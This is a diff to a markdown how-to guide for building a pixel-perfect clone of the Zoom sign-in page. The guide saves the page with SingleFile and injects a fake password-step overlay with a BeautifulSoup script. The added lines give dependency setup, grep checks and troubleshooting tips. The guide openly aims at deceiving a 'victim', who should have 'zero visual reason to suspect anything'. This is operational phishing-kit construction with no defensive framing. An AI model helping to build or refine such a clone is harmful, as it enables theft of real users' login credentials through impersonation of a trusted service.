@@ -46,7 +46,14 @@ single-file "https://zoom.us/signin" ~/ZoomSignin/signin.html --browser-executab
 
 ## Step 3 — The modification script
 
-A single Python pass (using BeautifulSoup) fixes everything at once:
+A single Python pass (using BeautifulSoup) fixes everything at once. Install the dependency first:
+
+```bash
+pip3 install beautifulsoup4
+```
+
+> [!danger] `ModuleNotFoundError: No module named 'bs4'`
+> BeautifulSoup isn't part of the standard library — run the `pip3 install beautifulsoup4` above before executing the script.
 
 ```python
 import re
@@ -128,6 +135,16 @@ print('Done')
 
 > [!example] Result
 > Reloading the page now shows a fully convincing flow: the cookie banner appears and dismisses correctly, and entering an email and clicking Next transitions smoothly into a password step — header and sidebar image still visible underneath, exactly matching the real Zoom experience.
+
+> [!tip] Sanity-check the injection before opening a browser
+> ```bash
+> grep -c "pw-overlay" signin.html   # should be exactly 1
+> grep -c "goToPassword" signin.html
+> ```
+> A count greater than 1 means the script ran more than once against the same file (see below) — go back to Step 2 for a clean copy rather than trying to untangle duplicated markup by hand.
+
+> [!danger] Running the script more than once against the same file
+> The script appends `extras` unconditionally with no idempotency check — run it twice on the same `signin.html` and you get **two** stacked password overlays sharing the same element IDs (`pw-overlay`, `pw-input`, etc.). Duplicate IDs break `document.getElementById()` lookups unpredictably, so `goToPassword()` may silently target the wrong element. Always start from a fresh SingleFile export (Step 2) before re-running the modification script.
 
 > [!success] What a finished clone looks like
 > Indistinguishable from the original at every interactive step — no broken buttons, no dead links, no visible errors. The victim should have zero visual reason to suspect anything.
